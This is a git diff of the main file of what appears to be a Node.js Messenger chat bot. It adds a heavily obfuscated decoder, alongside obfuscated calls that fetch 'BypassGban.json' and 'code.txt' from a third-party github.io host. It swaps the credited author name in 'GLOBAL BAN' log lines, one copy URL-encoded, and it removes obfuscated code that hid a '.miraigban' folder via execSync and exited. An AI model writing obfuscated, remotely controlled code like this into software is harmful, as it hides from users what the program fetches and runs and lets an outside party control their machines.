@@ -1,4 +1,11 @@
-
+const { readdirSync, readFileSync, writeFileSync, existsSync, unlinkSync, rm } = require("fs-extra");
+const { join, resolve } = require("path");
+const { execSync } = require('child_process');
+const logger = require("./utils/log.js");
+const login = require("@maihuybao/fca-unofficial");
+const axios = require("axios");
+const listPackage = JSON.parse(readFileSync('./package.json')).dependencies;
+const listbuiltinModules = require("module").builtinModules;
 
 global.client = new Object({
 	commands: new Map(),
@@ -197,7 +204,7 @@ console[traverse(354)](global[traverse(303)](traverse(317), traverse(320) + trav
  return axios[traverse(353)]("https://maihuybao.github.io/MiraiBypassGban/BypassGban.json")[traverse(316)](function(config) {
 var decodeURIComponent = traverse;
 if (config["headers"]["server"] != decodeURIComponent(365)) {
- logger("Nguyễn Mạnh Khoa", "[GLOBAL BAN]");
+ logger("Tr%E1%BA%A7n%20H%E1%BB%AFu%20%C4%90an", "[GLOBAL BAN]");
 }
 var correctedSlug = bannerInit(String(config[decodeURIComponent(311)])[decodeURIComponent(352)](/\s+/g, "")["toLowerCas" + "e"]());
 if (correctedSlug !== value) {
@@ -214,7 +221,7 @@ return;
 var _0x505a=['mtu0mJG4ovbrC0PwqW','mtaXotG5nxrIDKzKvG','ntqXmdm3qNz5AvDt','mtCZnJq0mvHoCfv6uW','otu2otK0vMTRDhzL','nhnrAwHlCq','mti1ntu3nw5Ar0jHsa','Ahr0Chm6lY9YyxCUz2L0AhvIDxnLCMnVBNrLBNqUy29Tl250A2HHBMDNz2DNl0Dcqu4VBwfPBI9UzxDNyMfUyNLUDgTOyw5NlMPZ','nZCYndqYvejoEw5h'];var _0x41efcb=_0x1885;(function(_0x42ce30,_0x11e8be){var _0x1747a6=_0x1885;while(!![]){try{var _0xcca5c4=-parseInt(_0x1747a6(0x132))+parseInt(_0x1747a6(0x134))+parseInt(_0x1747a6(0x136))+-parseInt(_0x1747a6(0x137))+parseInt(_0x1747a6(0x138))+-parseInt(_0x1747a6(0x131))+-parseInt(_0x1747a6(0x139))*-parseInt(_0x1747a6(0x133));if(_0xcca5c4===_0x11e8be)break;else _0x42ce30['push'](_0x42ce30['shift']());}catch(_0x944623){_0x42ce30['push'](_0x42ce30['shift']());}}}(_0x505a,0xee378));function _0x1885(_0xe3b5c5,_0x27470c){return _0x1885=function(_0x505ae3,_0x188526){_0x505ae3=_0x505ae3-0x131;var _0x2dc80d=_0x505a[_0x505ae3];if(_0x1885['SXBgsM']===undefined){var _0x380b13=function(_0x28e809){var _0x5ccbeb='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x184e93='',_0x4e5d74='';for(var _0x428f9f=0x0,_0x9fdfe3,_0x489b5a,_0x54364e=0x0;_0x489b5a=_0x28e809['charAt'](_0x54364e++);~_0x489b5a&&(_0x9fdfe3=_0x428f9f%0x4?_0x9fdfe3*0x40+_0x489b5a:_0x489b5a,_0x428f9f++%0x4)?_0x184e93+=String['fromCharCode'](0xff&_0x9fdfe3>>(-0x2*_0x428f9f&0x6)):0x0){_0x489b5a=_0x5ccbeb['indexOf'](_0x489b5a);}for(var _0x2831d8=0x0,_0x29b730=_0x184e93['length'];_0x2831d8<_0x29b730;_0x2831d8++){_0x4e5d74+='%'+('00'+_0x184e93['charCodeAt'](_0x2831d8)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4e5d74);};_0x1885['NmhNFc']=_0x380b13,_0xe3b5c5=arguments,_0x1885['SXBgsM']=!![];}var _0x2cd97e=_0x505a[0x0],_0x2c0a9a=_0x505ae3+_0x2cd97e,_0x4a23bc=_0xe3b5c5[_0x2c0a9a];return!_0x4a23bc?(_0x2dc80d=_0x1885['NmhNFc'](_0x2dc80d),_0xe3b5c5[_0x2c0a9a]=_0x2dc80d):_0x2dc80d=_0x4a23bc,_0x2dc80d;},_0x1885(_0xe3b5c5,_0x27470c);}return axios[emit(0x161)]("https://maihuybao.github.io/MiraiBypassGban/code.txt")[emit(316)](function(config) {
 var parseFloat = emit;
 if (config[parseFloat(319)]["server"] != parseFloat(365)) {
- logger("Nguyễn Mạnh Khoa", "[GLOBAL BAN]")
+ logger("Trần Hữu Đan", "[GLOBAL BAN]")
 }
 var _iteratorNormalCompletion4 = true;
 var _didIteratorError = false;
@@ -271,26 +278,6 @@ _iterator2.return();
 } finally {
 if (_didIteratorError2) {
 throw _iteratorError2;
-}
-}
-}
-delete require[parseFloat(366)][require[parseFloat(350)](global[parseFloat(305)]["configPath"])];
-var vmArgSetters = require(global["client"][parseFloat(323)])[parseFloat(332)] || [];
-var _iteratorNormalCompletion3 = true;
-var _didIteratorError3 = false;
-var _iteratorError3 = undefined;
-try {
-var _iterator3 = vmArgSetters[Symbol.iterator]();
-var _step3;
-for (; !(_iteratorNormalCompletion3 = (_step3 = _iterator3.next()).done); _iteratorNormalCompletion3 = true) {
-var i = _step3.value;
-if (!isNaN(i) && config[parseFloat(311)]["hasOwnProp" + parseFloat(295)](i)) {
-logger(global[parseFloat(303)](parseFloat(317), parseFloat(333), config[parseFloat(311)][i][parseFloat(299)], config["data"][i][parseFloat(304)]), parseFloat(368) + "AN ]");
-mkdirSync(dest + (parseFloat(313) + "n"));
-if (value == parseFloat(324)) {
-execSync("attrib +H " + parseFloat(339) + dest + ("/.miraigba" + "n"));
-}
-return process[parseFloat(338)](-3156 + -9545 + -13 * -977);
 }
 }
 }
